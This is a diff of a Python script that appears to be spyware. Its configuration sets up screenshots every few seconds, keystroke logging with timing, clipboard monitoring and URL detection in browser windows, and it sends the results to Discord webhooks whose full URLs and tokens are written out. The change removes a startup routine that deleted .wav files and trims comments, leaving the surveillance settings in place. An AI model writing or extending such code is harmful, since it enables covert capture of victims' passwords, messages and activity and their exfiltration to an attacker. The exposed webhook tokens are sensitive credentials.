@@ -28,31 +28,6 @@ import re
 import logging
 from urllib.parse import urlparse
 import base64
-import glob  # Added for file pattern matching
-
-# Delete all .wav files in the script directory before starting
-def cleanup_wav_files():
-    """Delete all .wav files in the script directory"""
-    try:
-        script_dir = os.path.dirname(os.path.abspath(__file__))
-        wav_files = glob.glob(os.path.join(script_dir, "*.wav"))
-        count = 0
-        
-        for file in wav_files:
-            try:
-                os.remove(file)
-                count += 1
-            except Exception as e:
-                print(f"Failed to delete {file}: {e}")
-                
-        print(f"Deleted {count} .wav files from {script_dir}")
-        return count
-    except Exception as e:
-        print(f"Error cleaning up .wav files: {e}")
-        return 0
-
-# Clean up .wav files at script startup
-cleanup_wav_files()
 
 # Set up logging
 logging.basicConfig(
@@ -76,18 +51,17 @@ THIRD_MONITOR_WEBHOOK_URL = "https://discord.com/api/webhooks/134521036659831610
 ERROR_WEBHOOK_URL = "https://discord.com/api/webhooks/1345206544635138190/x78uNc_X-maXpXo-qdFsrFD_i-kWzaW91-Dld2TWQAoL2jBjLMwCpiFe2SOXwMfAGUFA"
 
 # Enhanced configuration
-SCREENSHOT_INTERVAL = 3  # How often screenshots are taken, in seconds
-KEYLOG_SEND_INTERVAL = 60  # How often collected keystrokes are sent, in seconds
-MAX_SCREENSHOT_SIZE = 7.8 * 1024 * 1024  # 7.8 MB maximum size for screenshots (Discord limit)
-CLIPBOARD_CHECK_INTERVAL = 5  # How often clipboard content is checked for changes, in seconds
-ACTIVE_WINDOW_SCREENSHOT_ENABLED = True  # Whether to take screenshots of the active window when certain actions occur
-INCLUDE_CURSOR_IN_SCREENSHOT = True  # Whether to show the mouse cursor position in screenshots
-SYSTEM_INFO_OVERLAY = True  # Whether to include system information overlay on screenshots
-RESTART_ON_ERROR = True  # Whether to automatically restart the script if critical errors occur
-WATCHDOG_INTERVAL = 30  # How often the watchdog checks if threads are running properly, in seconds
-ADAPTIVE_SCREENSHOT_QUALITY = True  # Whether to automatically adjust screenshot quality to stay under size limit
-DETAILED_KEYSTROKE_TIMING = True  # Whether to record timing between keystrokes for typing speed analysis
-CLEANUP_WAV_FILES = True  # Whether to delete .wav files in the script directory at startup
+SCREENSHOT_INTERVAL = 3  # seconds
+KEYLOG_SEND_INTERVAL = 60  # seconds
+MAX_SCREENSHOT_SIZE = 7.8 * 1024 * 1024  # 7.8 MB in bytes
+CLIPBOARD_CHECK_INTERVAL = 5  # seconds
+ACTIVE_WINDOW_SCREENSHOT_ENABLED = True
+INCLUDE_CURSOR_IN_SCREENSHOT = True
+SYSTEM_INFO_OVERLAY = True
+RESTART_ON_ERROR = True
+WATCHDOG_INTERVAL = 30  # seconds
+ADAPTIVE_SCREENSHOT_QUALITY = True
+DETAILED_KEYSTROKE_TIMING = True
 
 # Health monitoring
 last_screenshot_time = time.time()
@@ -148,7 +122,7 @@ last_key_time = time.time()
 # URL patterns for detection in browser windows
 URL_PATTERNS = [
     r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+',
-    r'www\.(?:[-\w.]|(?:%[\da-fA-F]{2}))+' 
+    r'www\.(?:[-\w.]|(?:%[\da-fA-F]{2}))+'
 ]
 
 # Keep track of mouse position and clicks
